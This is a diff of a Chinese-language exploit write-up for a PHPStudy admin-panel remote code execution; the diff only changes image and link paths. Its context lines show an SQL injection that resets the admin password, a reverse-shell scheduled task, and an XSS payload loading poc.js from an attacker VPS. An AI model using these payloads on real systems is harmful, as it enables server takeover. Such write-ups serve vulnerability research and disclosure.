@@ -21,7 +21,7 @@ phpstudy 访问面板登录页面需要添加如下 Headers：
 x-requested-with: XMLHttpRequest
 ```
 
-![image-20230519091358703](images/image-20230519091358703.png)
+![image-20230519091358703](../.gitbook/assets/image-20230519091358703.png)
 
 在用户登录处构造 Payload，其中 Password 的值是经过五次 md5 加密后的结果，脚本如下：
 
@@ -41,19 +41,19 @@ admin';UPDATE ADMINS set PASSWORD = 'c26be8aaf53b15054896983b43eb6a65' where use
 
 虽然提示错误信息，但此时已经成功将用户名/密码修改为： `admin/123456`
 
-![image-20230519092040856](images/image-20230519092040856.png)
+![image-20230519092040856](../.gitbook/assets/image-20230519092040856.png)
 
 在后台计划任务处创建一个反弹 shell 脚本，点击执行：
 
-![image-20230519092608985](images/image-20230519092608985.png)
+![image-20230519092608985](../.gitbook/assets/image-20230519092608985.png)
 
 服务器端监听，成功接收反弹 Shell：
 
-![image-20230519092655024](images/image-20230519092655024.png)
+![image-20230519092655024](../.gitbook/assets/image-20230519092655024.png)
 
 ### 方式 2 XSS
 
-在 VPS 上放置 [poc.js](#漏洞POC)，监听 8888 端口，并通过以下命令启动 HTTP 服务：
+在 VPS 上放置 [poc.js](<PHPStudy 后台管理页面 one click RCE.md#漏洞POC>)，监听 8888 端口，并通过以下命令启动 HTTP 服务：
 
 ```
 python3 -m http.server 9999
@@ -65,15 +65,15 @@ python3 -m http.server 9999
 <script src="http://<your-vps-ip>:9999/poc.js"></script>
 ```
 
-![image-20230519100003117](images/image-20230519100003117.png)
+![image-20230519100003117](../.gitbook/assets/image-20230519100003117.png)
 
 通过方式 1，已经获得了用户名/密码为 admin/123456，进入后台验证一下计划任务是否成功写入：
 
-![image-20230519100442704](images/image-20230519100442704.png)
+![image-20230519100442704](../.gitbook/assets/image-20230519100442704.png)
 
 等待 1 分钟，成功接收反弹 Shell：
 
-![image-20230519094345974](images/image-20230519094345974.png)
+![image-20230519094345974](../.gitbook/assets/image-20230519094345974.png)
 
 ## 漏洞POC
 
@@ -140,4 +140,3 @@ function save() {
 
 save();
 ```
-
